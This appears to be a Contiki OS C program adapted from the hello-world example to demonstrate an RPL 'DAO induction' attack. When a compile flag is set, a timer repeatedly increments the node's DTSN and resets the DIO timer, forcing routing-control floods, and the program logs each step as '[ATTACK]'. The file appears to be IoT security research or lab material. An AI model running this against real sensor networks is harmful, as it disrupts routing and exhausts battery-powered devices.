/*
 * Copyright (c) 2006, Swedish Institute of Computer Science.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the Institute nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE INSTITUTE AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE INSTITUTE OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * This file is part of the Contiki operating system.
 *
 */

/**
 * \file
 *         A very simple Contiki application showing how Contiki programs look
 * \author
 *         Adam Dunkels <adam@sics.se>
 */

#include "contiki.h"
#include "net/routing/rpl-lite/rpl.h"
#include "net/routing/rpl-lite/rpl-dag.h"
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "net/ipv6/uip.h"

#include <stdio.h> /* For printf() */

#if FILTER_BR_DIO
int reject_br_dio(rpl_dio_t *dio)
{
  static uip_ipaddr_t br_lladdr;
  static int initialized = 0;
  if(!initialized) {
    // We need to replace this with the border router's IP address
    uip_ip6addr(&br_lladdr, 0xfe80, 0x0000, 0x0000, 0x0000,
                             0xf6ce, 0x36cd, 0x8c36, 0x795b);
    /* ------------------------------------------------------------------ */
    initialized = 1;
  }
  return !uip_ipaddr_cmp(&UIP_IP_BUF->srcipaddr, &br_lladdr);
}
#endif

#ifndef DAO_INDUCTION_CLIENT
#define DAO_INDUCTION_CLIENT 0
#endif

#ifndef DAO_ATTACK_PERIOD_SECONDS
#define DAO_ATTACK_PERIOD_SECONDS 15
#endif
/*---------------------------------------------------------------------------*/
PROCESS(hello_world_process, "Hello world process");
AUTOSTART_PROCESSES(&hello_world_process);
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(hello_world_process, ev, data)
{
  static struct etimer hello_timer;
#if DAO_INDUCTION_CLIENT
  static struct etimer dao_attack_timer;
#endif

  PROCESS_BEGIN();

  /* Setup a periodic timer that expires after 10 seconds. */
  etimer_set(&hello_timer, CLOCK_SECOND * 10);

#if DAO_INDUCTION_CLIENT
  etimer_set(&dao_attack_timer, CLOCK_SECOND * DAO_ATTACK_PERIOD_SECONDS);
  printf("[ATTACK] DAO induction client enabled, period %u seconds\n",
         DAO_ATTACK_PERIOD_SECONDS);
#endif

  while(1) {
    PROCESS_WAIT_EVENT();

    if(etimer_expired(&hello_timer)) {
      printf("Hello, world\n");
      etimer_reset(&hello_timer);
    }

#if DAO_INDUCTION_CLIENT
    if(etimer_expired(&dao_attack_timer)) {
      if(rpl_is_reachable()) {
        RPL_LOLLIPOP_INCREMENT(curr_instance.dtsn_out);
        printf("[ATTACK] Incremented local DTSN to %u, forcing DIO\n",
               curr_instance.dtsn_out);
        rpl_timers_dio_reset("client dao induction demo");
      } else {
        printf("[ATTACK] Not joined to RPL yet, skipping trigger\n");
      }
      etimer_reset(&dao_attack_timer);
    }
#endif
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
